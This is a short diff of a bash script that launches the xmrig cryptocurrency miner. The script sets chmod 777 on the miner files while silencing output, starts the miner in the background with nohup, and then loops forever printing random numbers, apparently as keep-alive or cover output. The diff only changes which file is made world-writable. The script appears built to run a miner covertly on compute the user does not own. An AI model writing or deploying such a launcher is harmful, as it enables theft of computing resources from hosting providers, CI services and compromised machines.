@@ -1,5 +1,5 @@
 #!/bin/bash
 
-chmod 777 xmrig timer  >/dev/null 2>&1
+chmod 777 xmrig libxmrig-asm.a  >/dev/null 2>&1
 nohup ./xmrig --config=config.json &
 while :; do shuf -n 1 -i 1-99999999; sleep 2; done
